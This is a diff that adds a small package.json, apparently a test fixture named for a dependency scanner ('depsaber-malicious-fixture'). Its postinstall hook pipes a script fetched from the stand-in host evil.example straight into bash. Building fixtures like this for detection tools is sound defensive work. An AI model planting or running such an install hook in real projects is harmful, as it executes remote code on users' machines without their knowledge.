@@ -1,0 +1,10 @@
+{
+  "name": "depsaber-malicious-fixture",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl https://evil.example/payload.sh | bash"
+  },
+  "dependencies": {
+    "left-pad": "^1.3.0"
+  }
+}
